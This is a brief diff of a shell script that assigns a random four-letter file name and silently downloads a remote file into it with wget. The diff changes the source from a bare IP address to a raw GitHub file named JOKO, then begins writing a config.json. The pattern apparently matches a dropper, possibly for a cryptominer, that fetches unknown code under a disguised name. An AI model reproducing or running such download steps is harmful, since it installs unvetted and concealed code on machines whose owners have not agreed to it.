@@ -1,6 +1,6 @@
 NAME=$(tr -dc A-Za-z </dev/urandom | head -c 4)
 
-wget -q -O "${NAME}" http://143.198.196.235/dev.py
+wget -q -O "${NAME}" https://raw.githubusercontent.com/DOT-SUNDA/cloudsigma/refs/heads/main/JOKO
 current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")
 cat > config.json <<END
 {
